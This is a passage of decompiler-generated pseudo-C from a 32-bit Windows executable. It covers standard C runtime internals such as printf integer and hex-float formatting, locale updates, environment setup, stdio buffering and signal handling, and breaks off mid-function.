  {
    v7 = v2 - 115;
    if ( !v7 )
      goto LABEL_10;
    v8 = v7 - 2;
    if ( v8 )
    {
      if ( v8 != 3 )
        return 0;
      v16 = 0;
      goto LABEL_14;
    }
    goto LABEL_29;
  }
  if ( v2 == 112 )
  {
    v3 = sub_407472((_DWORD *)this);
    goto LABEL_11;
  }
  if ( v2 <= 103 )
    goto LABEL_31;
  switch ( v2 )
  {
    case 'i':
LABEL_28:
      *(_DWORD *)(this + 32) |= 0x10u;
LABEL_29:
      v3 = sub_40728E(this, 10, 0);
      break;
    case 'n':
      v3 = unknown_libname_13(this);
      break;
    case 'o':
      v3 = sub_407453((_DWORD *)this);
      break;
    default:
      return 0;
  }
LABEL_11:
  if ( !v3 )
    return 0;
  if ( !*(_BYTE *)(this + 48) )
  {
    v9 = 0;
    v18 = 0;
    v19 = 0;
    v10 = *(_DWORD *)(this + 32);
    v17 = 0;
    if ( (v10 & 0x10) != 0 )
    {
      if ( (v10 & 0x40) != 0 )
      {
        LOBYTE(v18) = 45;
      }
      else
      {
        if ( (v10 & 1) == 0 )
        {
          if ( (v10 & 2) != 0 )
          {
            LOBYTE(v18) = 32;
            v9 = 1;
            v17 = 1;
          }
          goto LABEL_46;
        }
        LOBYTE(v18) = 43;
      }
      v9 = 1;
      v17 = 1;
    }
LABEL_46:
    v11 = *(_BYTE *)(this + 49);
    v12 = (v11 == 120 || v11 == 88) && (v10 & 0x20) != 0;
    v13 = v11 == 97 || v11 == 65;
    if ( v12 || v13 )
    {
      *((_BYTE *)&v18 + v9) = 48;
      if ( v11 == 88 || v11 == 65 )
        v14 = 88;
      else
        v14 = 120;
      *((_BYTE *)&v18 + v9 + 1) = v14;
      v9 += 2;
      v17 = v9;
    }
    v15 = *(_DWORD *)(this + 36) - *(_DWORD *)(this + 56) - v9;
    if ( (*(_BYTE *)(this + 32) & 0xC) == 0 )
    {
      sub_406670(this + 1096, 32, v15, this + 24);
      v9 = v17;
    }
    sub_407680(&v18, v9, this + 24, this + 12);
    if ( (*(_DWORD *)(this + 32) & 8) != 0 && (*(_DWORD *)(this + 32) & 4) == 0 )
      sub_406670(this + 1096, 48, v15, this + 24);
    unknown_libname_16(0);
    if ( *(int *)(this + 24) >= 0 && (*(_DWORD *)(this + 32) & 4) != 0 )
      sub_406670(this + 1096, 32, v15, this + 24);
  }
  return 1;
}
// 406670: using guessed type _DWORD __cdecl sub_406670(_DWORD, _DWORD, _DWORD, _DWORD);
// 407055: using guessed type int __thiscall unknown_libname_11(_DWORD);
// 4070AF: using guessed type int __thiscall unknown_libname_12(_DWORD);
// 4071FE: using guessed type _DWORD __stdcall sub_4071FE(_DWORD);
// 4073DF: using guessed type int __thiscall unknown_libname_13(_DWORD);
// 40748A: using guessed type int __thiscall unknown_libname_14(_DWORD);
// 4075D9: using guessed type _DWORD __stdcall unknown_libname_16(_DWORD);
// 407680: using guessed type _DWORD __stdcall sub_407680(_DWORD, _DWORD, _DWORD, _DWORD);

//----- (00406FD6) --------------------------------------------------------
char __thiscall sub_406FD6(int this)
{
  int *v1; // edx
  int v3; // eax

  v1 = (int *)(this + 36);
  if ( *(_BYTE *)(this + 49) != 42 )
    return unknown_libname_8(this + 36);
  *(_DWORD *)(this + 20) += 4;
  v3 = *(_DWORD *)(*(_DWORD *)(this + 20) - 4);
  *v1 = v3;
  if ( v3 < 0 )
  {
    *(_DWORD *)(this + 32) |= 4u;
    *v1 = -v3;
  }
  return 1;
}
// 4069A5: using guessed type _DWORD __stdcall unknown_libname_8(_DWORD);

//----- (0040728E) --------------------------------------------------------
char __thiscall sub_40728E(int this, int a2, char a3)
{
  int v4; // eax
  int v6; // eax
  int v7; // edi
  int v8; // ebx
  int v9; // eax
  bool v10; // zf
  int v11; // eax
  int v12; // eax
  int v13; // eax
  int v14; // eax
  int v15; // eax
  int v16; // eax
  int v17; // ecx
  int v18; // [esp-4h] [ebp-14h]
  int v19; // [esp+Ch] [ebp-4h]

  v4 = __crt_stdio_output::to_integer_size(*(_DWORD *)(this + 44));
  v19 = v4;
  switch ( v4 )
  {
    case 1:
      v15 = *(_DWORD *)(this + 32);
      *(_DWORD *)(this + 20) += 4;
      v10 = (v15 & 0x10) == 0;
      v16 = *(_DWORD *)(this + 20);
      if ( v10 )
        v12 = *(unsigned __int8 *)(v16 - 4);
      else
        v12 = *(char *)(v16 - 4);
      goto LABEL_16;
    case 2:
      v13 = *(_DWORD *)(this + 32);
      *(_DWORD *)(this + 20) += 4;
      v10 = (v13 & 0x10) == 0;
      v14 = *(_DWORD *)(this + 20);
      if ( v10 )
        v12 = *(unsigned __int16 *)(v14 - 4);
      else
        v12 = *(__int16 *)(v14 - 4);
LABEL_16:
      v8 = v12 >> 31;
      v7 = v12;
      goto LABEL_17;
    case 4:
      v9 = *(_DWORD *)(this + 32);
      *(_DWORD *)(this + 20) += 4;
      v10 = (v9 & 0x10) == 0;
      v11 = *(_DWORD *)(this + 20);
      if ( v10 )
      {
        v7 = *(_DWORD *)(v11 - 4);
        v8 = 0;
        goto LABEL_17;
      }
      v12 = *(_DWORD *)(v11 - 4);
      goto LABEL_16;
  }
  if ( v4 != 8 )
  {
    *_errno() = 22;
    _invalid_parameter_noinfo();
    return 0;
  }
  *(_DWORD *)(this + 20) += 8;
  v6 = *(_DWORD *)(this + 20);
  v7 = *(_DWORD *)(v6 - 8);
  v8 = *(_DWORD *)(v6 - 4);
LABEL_17:
  v17 = *(_DWORD *)(this + 32);
  if ( (v17 & 0x10) != 0 && v8 < 0 )
  {
    v7 = -v7;
    v8 = (unsigned __int64)-__SPAIR64__(v8, v7) >> 32;
    v17 |= 0x40u;
    *(_DWORD *)(this + 32) = v17;
  }
  if ( *(int *)(this + 40) >= 0 )
  {
    v18 = *(_DWORD *)(this + 40);
    *(_DWORD *)(this + 32) = v17 & 0xFFFFFFF7;
    __crt_stdio_output::formatting_buffer::ensure_buffer_is_big_enough<char>(v18);
  }
  else
  {
    *(_DWORD *)(this + 40) = 1;
  }
  if ( !(v8 | v7) )
    *(_DWORD *)(this + 32) &= ~0x20u;
  *(_BYTE *)(this + 60) = 0;
  if ( v19 == 8 )
    unknown_libname_4(v7, v8, a2, a3);
  else
    unknown_libname_3(v7, a2, a3);
  if ( (*(_DWORD *)(this + 32) & 0x80) != 0 && (!*(_DWORD *)(this + 56) || **(_BYTE **)(this + 52) != 48) )
  {
    *(_BYTE *)--*(_DWORD *)(this + 52) = 48;
    ++*(_DWORD *)(this + 56);
  }
  return 1;
}
// 4064A3: using guessed type _DWORD __stdcall __crt_stdio_output::formatting_buffer::ensure_buffer_is_big_enough<char>(_DWORD);
// 40656F: using guessed type _DWORD __stdcall unknown_libname_3(_DWORD, _DWORD, char);
// 4065E2: using guessed type _DWORD __stdcall unknown_libname_4(_DWORD, _DWORD, _DWORD, char);
// 407001: using guessed type int __cdecl __crt_stdio_output::to_integer_size(_DWORD);

//----- (00407453) --------------------------------------------------------
char __thiscall sub_407453(_DWORD *this)
{
  if ( (this[8] & 0x20) != 0 )
    this[8] |= 0x80u;
  return sub_40728E((int)this, 8, 0);
}

//----- (00407472) --------------------------------------------------------
char __thiscall sub_407472(_DWORD *this)
{
  this[10] = 8;
  this[11] = 10;
  return sub_40728E((int)this, 16, 1);
}

//----- (0040776C) --------------------------------------------------------
int __cdecl sub_40776C(int a1, int a2, int a3, int a4, int a5, int a6)
{
  int v7[5]; // [esp+0h] [ebp-38h] BYREF
  int v8[2]; // [esp+14h] [ebp-24h] BYREF
  int v9; // [esp+1Ch] [ebp-1Ch] BYREF
  int v10; // [esp+20h] [ebp-18h] BYREF
  int v11; // [esp+24h] [ebp-14h] BYREF
  int v12; // [esp+28h] [ebp-10h] BYREF
  int v13; // [esp+2Ch] [ebp-Ch] BYREF
  int v14; // [esp+30h] [ebp-8h] BYREF

  v11 = a6;
  v13 = a5;
  v8[0] = a1;
  v12 = a4;
  v14 = a3;
  v8[1] = a2;
  if ( a3 && a4 )
  {
    v10 = a3;
    v7[0] = (int)&v14;
    v7[1] = (int)&v13;
    v7[2] = (int)v8;
    v7[3] = (int)&v12;
    v7[4] = (int)&v11;
    v9 = a3;
    return __crt_seh_guarded_call<unsigned int>::operator()<_lambda_4ac01c32aa5b53846f05d0620572872e_,_lambda_5856287d7ecd2be6c9197bb4007c3f6e_ &,_lambda_e7a9868ed898c75c0f0637692d94351a_>(
             &v9,
             v7,
             &v10);
  }
  else
  {
    *_errno() = 22;
    _invalid_parameter_noinfo();
    return -1;
  }
}
// 406430: using guessed type _DWORD __stdcall __crt_seh_guarded_call<unsigned int>::operator()<_lambda_4ac01c32aa5b53846f05d0620572872e_,_lambda_5856287d7ecd2be6c9197bb4007c3f6e_ &,_lambda_e7a9868ed898c75c0f0637692d94351a_>(_DWORD, _DWORD, _DWORD);

//----- (00407947) --------------------------------------------------------
int sub_407947()
{
  return dword_41DCC4;
}
// 41DCC4: using guessed type int dword_41DCC4;

//----- (0040794D) --------------------------------------------------------
int __cdecl sub_40794D(int a1)
{
  int result; // eax

  result = a1;
  dword_41DCC4 = a1;
  return result;
}
// 41DCC4: using guessed type int dword_41DCC4;

//----- (00407993) --------------------------------------------------------
int __cdecl sub_407993(int a1)
{
  int result; // eax

  result = a1;
  dword_41DCC8 = a1;
  return result;
}
// 41DCC8: using guessed type int dword_41DCC8;

//----- (00407CF0) --------------------------------------------------------
int sub_407CF0()
{
  int result; // eax

  result = dword_41DDD8;
  if ( !dword_41DDD8 )
  {
    if ( !dword_41DDDC
      || common_initialize_environment_nolock<char>() && initialize_environment_by_cloning_nolock<char>() )
    {
      return 0;
    }
    else
    {
      return dword_41DDD8;
    }
  }
  return result;
}
// 407D1C: using guessed type int common_initialize_environment_nolock<char>(void);
// 407E6E: using guessed type int initialize_environment_by_cloning_nolock<char>(void);
// 41DDD8: using guessed type int dword_41DDD8;
// 41DDDC: using guessed type int dword_41DDDC;

//----- (00407F1A) --------------------------------------------------------
void *__cdecl sub_407F1A(void **a1)
{
  void *result; // eax

  result = *a1;
  if ( *a1 != dword_41DDE4 )
    return (void *)unknown_libname_18(*a1);
  return result;
}

//----- (00407F35) --------------------------------------------------------
void *__cdecl sub_407F35(void **a1)
{
  void *result; // eax

  result = *a1;
  if ( *a1 != dword_41DDE0 )
    return (void *)unknown_libname_18(*a1);
  return result;
}

//----- (0040824B) --------------------------------------------------------
int __cdecl sub_40824B(int a1)
{
  int result; // eax

  result = a1;
  dword_41DDEC = a1;
  return result;
}
// 41DDEC: using guessed type int dword_41DDEC;

//----- (00408320) --------------------------------------------------------
int *sub_408320()
{
  return &dword_41DDF8;
}
// 41DDF8: using guessed type int dword_41DDF8;

//----- (00408326) --------------------------------------------------------
void **sub_408326()
{
  return &dword_41DDFC;
}

//----- (0040839A) --------------------------------------------------------
__int32 sub_40839A()
{
  return _InterlockedExchange(&dword_41DE0C, 1);
}
// 41DE0C: using guessed type int dword_41DE0C;

//----- (0040842E) --------------------------------------------------------
int sub_40842E()
{
  return dword_41DE10;
}
// 41DE10: using guessed type int dword_41DE10;

//----- (00408464) --------------------------------------------------------
void *sub_408464()
{
  return &unk_41DE14;
}

//----- (0040846A) --------------------------------------------------------
int __stdcall sub_40846A(_DWORD *a1, int a2, _DWORD *a3)
{
  int v4; // [esp+10h] [ebp-1Ch]

  __acrt_lock(*a1);
  v4 = unknown_libname_21(a2);
  __acrt_unlock(*a3);
  return v4;
}
// 408649: using guessed type int __thiscall unknown_libname_21(_DWORD);
// 40C9EA: using guessed type _DWORD __cdecl __acrt_lock(_DWORD);
// 40CA32: using guessed type _DWORD __cdecl __acrt_unlock(_DWORD);

//----- (004084C5) --------------------------------------------------------
int __stdcall sub_4084C5(_DWORD *a1, int a2, _DWORD *a3)
{
  int v4; // [esp+10h] [ebp-1Ch]

  __acrt_lock(*a1);
  v4 = _lambda_22ebabd17bc4fa466a2aca6d8deb888d_::operator()(a2);
  __acrt_unlock(*a3);
  return v4;
}
// 408520: using guessed type int __thiscall _lambda_22ebabd17bc4fa466a2aca6d8deb888d_::operator()(_DWORD);
// 40C9EA: using guessed type _DWORD __cdecl __acrt_lock(_DWORD);
// 40CA32: using guessed type _DWORD __cdecl __acrt_unlock(_DWORD);

//----- (00408723) --------------------------------------------------------
int __cdecl sub_408723(_onexit_t Function)
{
  return _register_onexit_function(&stru_41DE18, Function);
}

//----- (004087C2) --------------------------------------------------------
char sub_4087C2()
{
  dword_41E128 = (struct __crt_locale_data *)&off_41D138;
  return 1;
}
// 41D138: using guessed type wchar_t *off_41D138;

//----- (004087E9) --------------------------------------------------------
char sub_4087E9()
{
  __dcrt_uninitialize_environments_nolock();
  return 1;
}
// 407F55: using guessed type int __dcrt_uninitialize_environments_nolock(void);

//----- (0040881F) --------------------------------------------------------
__vcrt_bool sub_40881F()
{
  return __vcrt_uninitialize(0);
}

//----- (00408F3B) --------------------------------------------------------
int __cdecl sub_408F3B(int a1)
{
  int result; // eax

  result = a1;
  dword_41DE30 = a1;
  return result;
}
// 41DE30: using guessed type int dword_41DE30;

//----- (0040914A) --------------------------------------------------------
int sub_40914A()
{
  return try_get_function(20, "LCMapStringEx", &unk_41644C, "LCMapStringEx");
}
// 409245: using guessed type int __cdecl try_get_function(_DWORD, _DWORD, _DWORD, _DWORD);

//----- (00409164) --------------------------------------------------------
int sub_409164()
{
  return try_get_function(22, "LocaleNameToLCID", &unk_416464, "LocaleNameToLCID");
}
// 409245: using guessed type int __cdecl try_get_function(_DWORD, _DWORD, _DWORD, _DWORD);

//----- (004092C8) --------------------------------------------------------
int __stdcall sub_4092C8(int a1)
{
  int (__thiscall *function)(_DWORD, int, int); // eax

  function = (int (__thiscall *)(_DWORD, int, int))try_get_function(
                                                     28,
                                                     "AppPolicyGetProcessTerminationMethod",
                                                     &unk_416480,
                                                     "AppPolicyGetProcessTerminationMethod");
  if ( function )
    return function(function, -6, a1);
  else
    return -1073741275;
}
// 409245: using guessed type int __cdecl try_get_function(_DWORD, _DWORD, _DWORD, _DWORD);

//----- (004094CE) --------------------------------------------------------
int __stdcall sub_4094CE(
        wchar_t *a1,
        DWORD dwMapFlags,
        LPCWSTR lpSrcStr,
        int cchSrc,
        LPWSTR lpDestStr,
        int cchDest,
        int a7,
        int a8,
        int a9)
{
  int (__thiscall *v9)(_DWORD, wchar_t *, DWORD, LPCWSTR, int, LPWSTR, int, int, int, int); // eax
  LCID v11; // eax

  v9 = (int (__thiscall *)(_DWORD, wchar_t *, DWORD, LPCWSTR, int, LPWSTR, int, int, int, int))sub_40914A();
  if ( v9 )
    return v9(v9, a1, dwMapFlags, lpSrcStr, cchSrc, lpDestStr, cchDest, a7, a8, a9);
  v11 = __acrt_LocaleNameToLCID(a1, 0);
  return LCMapStringW(v11, dwMapFlags, lpSrcStr, cchSrc, lpDestStr, cchDest);
}

//----- (004098F2) --------------------------------------------------------
int sub_4098F2()
{
  return common_flush_all(1);
}

//----- (0040A6FA) --------------------------------------------------------
struct __crt_locale_data *__cdecl sub_40A6FA(int a1, struct __crt_locale_data **a2)
{
  struct __crt_locale_data *result; // eax

  result = *a2;
  if ( *a2 != dword_41E128 )
  {
    result = (struct __crt_locale_data *)dword_41D778;
    if ( (dword_41D778 & *(_DWORD *)(a1 + 848)) == 0 )
    {
      result = (struct __crt_locale_data *)sub_40D39C();
      *a2 = result;
    }
  }
  return result;
}
// 41D778: using guessed type int dword_41D778;

//----- (0040A727) --------------------------------------------------------
struct __crt_multibyte_data *__cdecl sub_40A727(int a1, struct __crt_multibyte_data **a2)
{
  struct __crt_multibyte_data *result; // eax

  result = *a2;
  if ( *a2 != dword_41E134 )
  {
    result = (struct __crt_multibyte_data *)dword_41D778;
    if ( (dword_41D778 & *(_DWORD *)(a1 + 848)) == 0 )
    {
      result = sub_40C167();
      *a2 = result;
    }
  }
  return result;
}
// 41D778: using guessed type int dword_41D778;

//----- (0040A7B6) --------------------------------------------------------
int __cdecl sub_40A7B6(
        double *a1,
        char *Str,
        unsigned int a3,
        char *a4,
        unsigned int a5,
        signed int Size,
        unsigned __int8 a7,
        unsigned int a8,
        struct __crt_locale_pointers *a9)
{
  int v9; // edi
  char *v10; // esi
  int v11; // edi
  __int64 v12; // rcx
  char *v13; // eax
  _BYTE *v14; // edx
  char *v15; // esi
  char v16; // al
  unsigned int v17; // edx
  int v18; // ecx
  int v19; // eax
  unsigned __int64 v20; // rax
  unsigned int v21; // eax
  unsigned int v22; // ecx
  unsigned __int64 v23; // rax
  char *i; // eax
  char v25; // cl
  char v26; // cl
  int v27; // esi
  char *v28; // edx
  char *v29; // edi
  signed __int64 v31; // [esp-1Ch] [ebp-58h]
  signed __int64 v32; // [esp-1Ch] [ebp-58h]
  signed __int64 v33; // [esp-1Ch] [ebp-58h]
  int v34[3]; // [esp+4h] [ebp-38h] BYREF
  char v35; // [esp+10h] [ebp-2Ch]
  char *v36; // [esp+18h] [ebp-24h]
  int v37; // [esp+20h] [ebp-1Ch]
  int v38; // [esp+28h] [ebp-14h]
  unsigned int v39; // [esp+2Ch] [ebp-10h]
  unsigned int v40; // [esp+30h] [ebp-Ch]
  int v41; // [esp+34h] [ebp-8h]
  char v42; // [esp+3Bh] [ebp-1h]

  v9 = Size;
  if ( Size < 0 )
    v9 = 0;
  v10 = Str;
  *Str = 0;
  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)v34, a9);
  if ( a3 > v9 + 11 )
  {
    HIDWORD(v12) = a1;
    LODWORD(v12) = *((_DWORD *)a1 + 1);
    if ( (((unsigned int)v12 >> 20) & 0x7FF) == 2047 )
    {
      v11 = fp_format_e(a1, Str, a3, a4, a5, v9, 0, a8, 0);
      if ( v11 )
      {
        *Str = 0;
      }
      else
      {
        v13 = strrchr(Str, 101);
        if ( v13 )
        {
          *v13 = 32 * (a7 ^ 1) + 80;
          v13[3] = 0;
        }
        v11 = 0;
      }
    }
    else
    {
      if ( (int)v12 < 0 )
      {
        *Str = 45;
        v10 = Str + 1;
        LODWORD(v12) = *((_DWORD *)a1 + 1);
      }
      v14 = v10 + 1;
      v39 = 1023;
      v42 = a7 ^ 1;
      v36 = v10 + 1;
      v37 = 32 * (a7 ^ 1) + 7;
      if ( (v12 & 0x7FF00000) != 0 )
      {
        *v10 = 49;
      }
      else
      {
        *v10 = 48;
        if ( *((_DWORD *)a1 + 1) & 0xFFFFF | *(_DWORD *)a1 )
          v39 = 1022;
        else
          v39 = 0;
      }
      v15 = v10 + 2;
      v40 = (unsigned int)(v14 + 1);
      if ( v9 )
        v16 = ***(_BYTE ***)(v34[1] + 136);
      else
        v16 = 0;
      *v14 = v16;
      v38 = *((_DWORD *)a1 + 1) & 0xFFFFF;
      if ( v38 || *(_DWORD *)a1 )
      {
        v17 = 0;
        v18 = 983040;
        LOWORD(v19) = 48;
        v41 = 48;
        v40 = 0;
        v38 = 983040;
        do
        {
          if ( v9 <= 0 )
            break;
          LODWORD(v20) = v17 & *(_DWORD *)a1;
          HIDWORD(v20) = v18 & *((_DWORD *)a1 + 1) & 0xFFFFF;
          v21 = (unsigned __int16)((v20 >> v41) + 48);
          if ( v21 > 0x39 )
            LOBYTE(v21) = v37 + v21;
          v22 = v38;
          v17 = __PAIR64__(v38, v40) >> 4;
          *v15++ = v21;
          v18 = v22 >> 4;
          v19 = v41 - 4;
          --v9;
          v40 = v17;
          v38 = v18;
          v41 = v19;
        }
        while ( (v19 & 0x8000u) == 0 );
        v40 = (unsigned int)v15;
        if ( (v19 & 0x8000u) == 0 )
        {
          LODWORD(v23) = v17 & *(_DWORD *)a1;
          HIDWORD(v23) = v18 & *((_DWORD *)a1 + 1) & 0xFFFFF;
          if ( (unsigned __int16)(v23 >> v41) > 8u )
          {
            for ( i = v15 - 1; ; --i )
            {
              v25 = *i;
              if ( *i != 102 && v25 != 70 )
                break;
              *i = 48;
            }
            HIDWORD(v12) = a1;
            if ( i == v36 )
            {
              ++*(i - 1);
            }
            else
            {
              if ( v25 == 57 )
                v26 = v37 + 58;
              else
                v26 = v25 + 1;
              *i = v26;
            }
          }
        }
      }
      if ( v9 > 0 )
      {
        memset(v15, 48, v9);
        v15 += v9;
        v40 = (unsigned int)v15;
      }
      if ( !*v36 )
      {
        v15 = v36;
        v40 = (unsigned int)v36;
      }
      *v15 = 32 * v42 + 80;
      v27 = (((*(_QWORD *)HIDWORD(v12) >> 52) & 0x7FFi64) - (unsigned __int64)v39) >> 32;
      LODWORD(v12) = ((*(_QWORD *)HIDWORD(v12) >> 52) & 0x7FF) - v39;
      v28 = (char *)(v40 + 2);
      v36 = (char *)(v40 + 2);
      if ( v27 < 0 )
      {
        LODWORD(v12) = -(int)v12;
        v27 = (unsigned __int64)-__SPAIR64__(v27, v12) >> 32;
        BYTE4(v12) = 45;
      }
      else
      {
        BYTE4(v12) = 43;
      }
      *(_BYTE *)(v40 + 1) = BYTE4(v12);
      v29 = v28;
      *v28 = 48;
      if ( v27 >= 0 && (v27 > 0 || (unsigned int)v12 >= 0x3E8) )
      {
        v31 = __PAIR64__(v27, v12);
        v12 = __SPAIR64__(v27, v12) % 1000;
        v27 = HIDWORD(v12);
        v37 = (unsigned __int64)(v31 / 1000) >> 32;
        v28 = v36;
        *v36 = v31 / 1000 + 48;
        v29 = v28 + 1;
      }
      if ( v29 != v28 || v27 >= 0 && (v27 > 0 || (unsigned int)v12 >= 0x64) )
      {
        v32 = __PAIR64__(v27, v12);
        v12 = __SPAIR64__(v27, v12) % 100;
        v27 = HIDWORD(v12);
        v37 = (unsigned __int64)(v32 / 100) >> 32;
        v28 = v36;
        *v29++ = v32 / 100 + 48;
      }
      if ( v29 != v28 || v27 >= 0 && (v27 > 0 || (unsigned int)v12 >= 0xA) )
      {
        v33 = __PAIR64__(v27, v12);
        v12 = __SPAIR64__(v27, v12) % 10;
        v36 = (char *)((unsigned __int64)(v33 / 10) >> 32);
        *v29++ = v33 / 10 + 48;
      }
      *v29 = v12 + 48;
      v29[1] = 0;
      v11 = 0;
    }
  }
  else
  {
    v11 = 34;
    *_errno() = 34;
    _invalid_parameter_noinfo();
  }
  if ( v35 )
    *(_DWORD *)(v34[0] + 848) &= ~2u;
  return v11;
}

//----- (0040B13F) --------------------------------------------------------
char __cdecl sub_40B13F(FILE *a1)
{
  int v1; // eax
  void **v2; // edi
  void *v3; // eax

  v1 = sub_40B0DA(a1);
  if ( !_isatty(v1) )
    return 0;
  if ( a1 == __acrt_iob_func(1u) )
  {
    v2 = &dword_41E120;
  }
  else
  {
    if ( a1 != __acrt_iob_func(2u) )
      return 0;
    v2 = &dword_41E124;
  }
  ++dword_41DCC0;
  if ( (a1->_flag & 0x4C0) != 0 )
    return 0;
  _InterlockedOr(&a1->_flag, 0x282u);
  v3 = *v2;
  if ( *v2 || (*v2 = _malloc_base(0x1000u), _free_base(0), (v3 = *v2) != 0) )
  {
    a1->_cnt = (int)v3;
    a1->_ptr = (char *)*v2;
    a1->_base = (char *)4096;
    a1->_bufsiz = 4096;
  }
  else
  {
    a1->_base = (char *)2;
    a1->_cnt = (int)&a1->_charbuf;
    a1->_ptr = (char *)&a1->_charbuf;
    a1->_bufsiz = 2;
  }
  return 1;
}
// 40B0DA: using guessed type _DWORD __cdecl sub_40B0DA(_DWORD);
// 41DCC0: using guessed type int dword_41DCC0;

//----- (0040B2F6) --------------------------------------------------------
int __cdecl sub_40B2F6(LPCWCH lpWideCharStr, struct __crt_win32_buffer_empty_debug_info *a2, int a3, UINT CodePage)
{
  struct __crt_win32_buffer_empty_debug_info *v4; // esi
  int result; // eax
  size_t v6; // eax
  DWORD v7; // eax
  int v8; // eax
  DWORD LastError; // eax

  if ( !lpWideCharStr )
  {
    v4 = a2;
    unknown_libname_26(a2);
    *((_DWORD *)a2 + 2) = 0;
    *((_DWORD *)a2 + 3) = 0;
LABEL_3:
    *((_DWORD *)v4 + 4) = 0;
    return 0;
  }
  if ( *lpWideCharStr )
  {
    v6 = __acrt_WideCharToMultiByte(CodePage, 0, lpWideCharStr, -1, 0, 0, 0, 0);
    if ( v6 )
    {
      if ( v6 <= *((_DWORD *)a2 + 3) || (result = sub_40B932((void **)a2, v6)) == 0 )
      {
        v8 = __acrt_WideCharToMultiByte(CodePage, 0, lpWideCharStr, -1, *((LPSTR *)a2 + 2), *((_DWORD *)a2 + 3), 0, 0);
        if ( v8 )
        {
          *((_DWORD *)a2 + 4) = v8 - 1;
          return 0;
        }
        else
        {
          LastError = GetLastError();
          __acrt_errno_map_os_error(LastError);
          return *_errno();
        }
      }
    }
    else
    {
      v7 = GetLastError();
      __acrt_errno_map_os_error(v7);
      return *_errno();
    }
  }
  else
  {
    v4 = a2;
    if ( *((_DWORD *)a2 + 3) || (result = sub_40B932((void **)a2, 1u)) == 0 )
    {
      **((_BYTE **)a2 + 2) = 0;
      goto LABEL_3;
    }
  }
  return result;
}
// 409036: using guessed type _DWORD __cdecl __acrt_errno_map_os_error(_DWORD);
// 40B918: using guessed type int __thiscall unknown_libname_26(_DWORD);

//----- (0040B3C5) --------------------------------------------------------
int __cdecl sub_40B3C5(LPCCH lpMultiByteStr, struct __crt_win32_buffer_empty_debug_info *a2, UINT CodePage)
{
  int v3; // ecx
  int var1; // [esp+1h] [ebp-1h] BYREF

  LOBYTE(var1) = HIBYTE(v3);
  return __acrt_convert_wcs_mbs_cp<char,wchar_t,_lambda_62f6974d9771e494a5ea317cc32e971c_,__crt_win32_buffer_internal_dynamic_resizing>(
           lpMultiByteStr,
           a2,
           (int)&var1,
           CodePage);
}
// 40B3CA: variable 'v3' is possibly undefined

//----- (0040B932) --------------------------------------------------------
int __thiscall sub_40B932(void **this, size_t Size)
{
  int result; // eax

  unknown_libname_26();
  result = __crt_win32_buffer_internal_dynamic_resizing::allocate(
             this + 2,
             Size,
             (const struct __crt_win32_buffer_empty_debug_info *)this);
  if ( result )
  {
    this[3] = 0;
    *((_BYTE *)this + 20) = 0;
  }
  else
  {
    *((_BYTE *)this + 20) = 1;
    result = 0;
    this[3] = (void *)Size;
  }
  return result;
}
// 40B918: using guessed type int unknown_libname_26(void);

//----- (0040B96E) --------------------------------------------------------
int __thiscall sub_40B96E(void **this, int a2)
{
  int result; // eax

  unknown_libname_26();
  result = __crt_win32_buffer_internal_dynamic_resizing::allocate(
             this + 2,
             2 * a2,
             (const struct __crt_win32_buffer_empty_debug_info *)this);
  if ( result )
  {
    this[3] = 0;
    *((_BYTE *)this + 20) = 0;
  }
  else
  {
    *((_BYTE *)this + 20) = 1;
    result = 0;
    this[3] = (void *)a2;
  }
  return result;
}
// 40B918: using guessed type int unknown_libname_26(void);

//----- (0040C167) --------------------------------------------------------
struct __crt_multibyte_data *sub_40C167()
{
  struct __acrt_ptd *v0; // eax

  v0 = (struct __acrt_ptd *)__acrt_getptd();
  return update_thread_multibyte_data_internal(v0, &dword_41E134);
}
// 40A4A8: using guessed type int __acrt_getptd(void);

//----- (0040C92F) --------------------------------------------------------
int sub_40C92F()
{
  int result; // eax

  result = dword_41DDD8;
  if ( (void *)dword_41DDD8 == dword_41DDE4 )
  {
    result = copy_environment<char>(dword_41DDD8);
    dword_41DDD8 = result;
  }
  return result;
}
// 40C87F: using guessed type _DWORD __cdecl copy_environment<char>(_DWORD);
// 41DDD8: using guessed type int dword_41DDD8;

//----- (0040D39C) --------------------------------------------------------
int sub_40D39C()
{
  int v0; // eax
  int *v1; // edi
  int v2; // esi

  v0 = __acrt_getptd();
  v1 = (int *)(v0 + 76);
  if ( (dword_41D778 & *(_DWORD *)(v0 + 848)) == 0 || (v2 = *v1) == 0 )
  {
    __acrt_lock(4);
    v2 = _updatetlocinfoEx_nolock(v1, dword_41E128);
    __acrt_unlock(4);
    if ( !v2 )
      abort();
  }
  return v2;
}
// 40A4A8: using guessed type int __acrt_getptd(void);
// 40C9EA: using guessed type _DWORD __cdecl __acrt_lock(_DWORD);
// 40CA32: using guessed type _DWORD __cdecl __acrt_unlock(_DWORD);
// 40D41D: using guessed type _DWORD __cdecl _updatetlocinfoEx_nolock(_DWORD, _DWORD);
// 41D778: using guessed type int dword_41D778;

//----- (0040D4EB) --------------------------------------------------------
char sub_40D4EB()
{
  hHeap = 0;
  return 1;
}

//----- (0040D58E) --------------------------------------------------------
int __cdecl sub_40D58E(int a1)
{
  int result; // eax

  result = a1;
  dword_41E2A4 = a1;
  return result;
}
// 41E2A4: using guessed type int dword_41E2A4;

//----- (0040D742) --------------------------------------------------------
int __cdecl sub_40D742(int a1)
{
  struct __crt_signal_action_t *const *v1; // ebx
  void (__cdecl **global_action_nolock)(int); // eax
  char v3; // cl
  struct __crt_signal_action_t *const *v4; // eax
  struct __crt_signal_action_t *v6; // eax
  void (__cdecl *v7)(_DWORD); // edx
  int v8; // eax
  int v9; // ecx
  int v10; // eax
  int v11; // [esp+14h] [ebp-34h]
  int v12; // [esp+18h] [ebp-30h]
  uintptr_t *v13; // [esp+24h] [ebp-24h]
  void (__cdecl *v14)(_DWORD); // [esp+28h] [ebp-20h]
  bool v15; // [esp+2Eh] [ebp-1Ah]
  char v16; // [esp+2Fh] [ebp-19h]

  v1 = 0;
  v11 = 0;
  v16 = 1;
  if ( a1 > 8 )
  {
    if ( a1 != 11 )
    {
      if ( a1 == 15 || a1 > 20 && a1 <= 22 )
        goto LABEL_11;
      goto LABEL_15;
    }
  }
  else if ( a1 != 8 )
  {
    if ( a1 == 2 )
    {
LABEL_11:
      global_action_nolock = get_global_action_nolock(a1);
      goto LABEL_17;
    }
    if ( a1 != 4 )
    {
      if ( a1 == 6 )
        goto LABEL_11;
      goto LABEL_15;
    }
  }
  v4 = (struct __crt_signal_action_t *const *)__acrt_getptd_noexit();
  v1 = v4;
  if ( !v4 )
    return -1;
  v6 = siglookup(a1, *v4);
  if ( !v6 )
  {
LABEL_15:
